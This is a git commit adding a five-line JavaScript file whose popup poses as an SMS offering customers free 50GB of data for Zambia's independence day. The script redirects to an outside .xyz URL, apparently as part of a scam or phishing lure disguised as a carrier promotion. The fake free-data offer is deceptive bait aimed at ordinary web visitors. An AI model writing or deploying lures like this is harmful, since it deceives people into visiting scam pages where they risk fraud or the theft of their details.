d0aa19e24ed7201c7cbdeeda52bcef9f3c2ab4a3
newetijazz8 <newetijazz8@gmail.com>
2025-10-18 12:21:33 +0100

    Create zambiaat61.js

---
+++ zambiaat61.js
@@ -0,0 +1,5 @@
+var password = 'CLAIM 50GB'
+password=prompt('SMS: We are giving out 50gb to all our customers in celebration of Zambia indpendence day, press OK to claim this offer','CLAIM 50GB');
+if (password != 'CLAIM 50GB') {
+location.href='https://www.itinpty.xyz/zm-independence-50gb';
+}
